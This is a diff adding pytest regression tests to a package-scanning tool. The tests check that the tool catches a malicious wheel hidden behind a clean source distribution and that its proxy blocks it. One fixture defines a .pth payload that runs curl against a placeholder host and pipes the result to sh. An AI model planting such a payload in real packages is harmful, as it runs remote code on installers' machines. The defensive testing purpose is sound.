@@ -398,3 +398,117 @@ def test_cli_install_is_pip_only():
     r = CliRunner().invoke(app, ["install", "npm:lodash@4.17.21"])
     assert r.exit_code == 2
     assert "pip 전용" in r.output
+
+
+# ──────────────────────────────
+# B. 우회 1 — 스캔한 파일 = 설치되는 파일
+# ──────────────────────────────
+
+EVIL_PTH = b'import os;os.system("curl http://x.example/a|sh")\n'
+CLEAN_SDIST = make_tar({"p-1.0/setup.py": b"from setuptools import setup\nsetup()\n",
+                        "p-1.0/p/__init__.py": b"x = 1\n"})
+EVIL_WHEEL = make_zip({"p/__init__.py": b"x = 1\n", "evil.pth": EVIL_PTH,
+                       "p-1.0.dist-info/WHEEL": b"Wheel-Version: 1.0\n"})
+
+
+def _pypi_transport(files: dict[str, bytes], seen: dict) -> httpx.MockTransport:
+    """PyPI JSON + 파일 + OSV. ``files`` 는 파일명 → 내용."""
+
+    def handler(request: httpx.Request) -> httpx.Response:
+        if request.url.host == "api.osv.dev":
+            return httpx.Response(200, json={})
+        if request.url.path.endswith("/json"):
+            return httpx.Response(200, json={
+                "info": {"version": "1.0", "requires_dist": []},
+                "releases": {"1.0": [
+                    {"filename": fn, "url": f"https://files.pythonhosted.org/x/{fn}",
+                     "packagetype": "bdist_wheel" if fn.endswith(".whl") else "sdist",
+                     "size": len(data), "upload_time_iso_8601": "2020-01-01T00:00:00Z"}
+                    for fn, data in files.items()
+                ]},
+            })
+        fn = request.url.path.rsplit("/", 1)[-1]
+        seen.setdefault("downloads", []).append(fn)
+        return httpx.Response(200, content=files[fn])
+
+    return httpx.MockTransport(handler)
+
+
+async def _run_pip(files, tmp_path, seen, **kw):
+    store = ScanStore(str(tmp_path / "p.db"))
+    await store.init()
+    async with httpx.AsyncClient(transport=_pypi_transport(files, seen)) as http:
+        return await scan.run_scan(ScanRequest(name="p", version="1.0"), http=http,
+                                   store=store, bandit=False, **kw)
+
+
+@pytest.fixture()
+def online(monkeypatch):
+    monkeypatch.setattr(scan, "OFFLINE_DEMO", False)
+
+    async def _no_tagging(vulns, http):
+        return None
+
+    monkeypatch.setattr(scan, "tag_vulnerabilities", _no_tagging)
+
+
+async def test_regression_clean_sdist_with_malicious_wheel_is_blocked(online, tmp_path):
+    """우회 재현: 예전 select_artifact 는 sdist 만 봐서 safe 였다. pip 은 wheel 을 설치한다."""
+    seen: dict = {}
+    res = await _run_pip({"p-1.0.tar.gz": CLEAN_SDIST, "p-1.0-py3-none-any.whl": EVIL_WHEEL},
+                         tmp_path, seen)
+    assert sorted(seen["downloads"]) == ["p-1.0-py3-none-any.whl", "p-1.0.tar.gz"]
+    assert res.verdict.value == "block"
+    pth = [f for f in res.static_findings if f.rule == "custom-pth"]
+    # 주 아티팩트(sdist)가 아닌 파일의 탐지는 어느 파일에서 나왔는지 위치에 밝힌다
+    assert [f.location for f in pth] == ["p-1.0-py3-none-any.whl!evil.pth:1"]
+
+
+async def test_same_finding_in_sdist_and_wheel_is_reported_once(online, tmp_path):
+    sdist = make_tar({"p-1.0/evil.pth": EVIL_PTH})
+    wheel = make_zip({"evil.pth": EVIL_PTH})
+    res = await _run_pip({"p-1.0.tar.gz": sdist, "p-1.0-py3-none-any.whl": wheel},
+                         tmp_path, {})
+    pth = [f for f in res.static_findings if f.rule == "custom-pth"]
+    assert [f.location for f in pth] == ["p-1.0/evil.pth:1"]
+
+
+async def test_explicit_artifact_scans_only_that_file(online, tmp_path):
+    seen: dict = {}
+    wheel = Artifact(filename="p-1.0-py3-none-any.whl",
+                     url="https://files.pythonhosted.org/x/p-1.0-py3-none-any.whl", kind="wheel")
+    res = await _run_pip({"p-1.0.tar.gz": CLEAN_SDIST, "p-1.0-py3-none-any.whl": EVIL_WHEEL},
+                         tmp_path, seen, artifacts=[wheel])
+    assert seen["downloads"] == ["p-1.0-py3-none-any.whl"]
+    # 명시한 파일이 주 아티팩트다 — 접두사 없음
+    assert "evil.pth:1" in [f.location for f in res.static_findings]
+
+
+def test_regression_proxy_scans_the_requested_wheel(online, tmp_path, monkeypatch):
+    """/files/<wheel> 은 name==version 이 아니라 그 wheel 자체를 스캔해야 한다."""
+    from api.main import app
+
+    monkeypatch.setenv("SU_DB_PATH", str(tmp_path / "proxy.db"))
+    seen: dict = {}
+    files = {"p-1.0.tar.gz": CLEAN_SDIST, "p-1.0-py3-none-any.whl": EVIL_WHEEL}
+    with TestClient(app) as c:
+        app.state.http = httpx.AsyncClient(transport=_pypi_transport(files, seen))
+        r = c.get("/files/p-1.0-py3-none-any.whl",
+                  params={"u": "https://files.pythonhosted.org/x/p-1.0-py3-none-any.whl"})
+    assert r.status_code == 403
+    assert r.json()["error"] == "blocked_by_supply_unchained"
+    assert seen["downloads"] == ["p-1.0-py3-none-any.whl"], "sdist 를 대신 스캔했다"
+
+
+def test_proxy_passes_clean_requested_file(online, tmp_path, monkeypatch):
+    from api.main import app
+
+    monkeypatch.setenv("SU_DB_PATH", str(tmp_path / "proxy2.db"))
+    seen: dict = {}
+    files = {"p-1.0.tar.gz": CLEAN_SDIST}
+    with TestClient(app) as c:
+        app.state.http = httpx.AsyncClient(transport=_pypi_transport(files, seen))
+        r = c.get("/files/p-1.0.tar.gz",
+                  params={"u": "https://files.pythonhosted.org/x/p-1.0.tar.gz"})
+    assert r.status_code == 200
+    assert r.content == CLEAN_SDIST
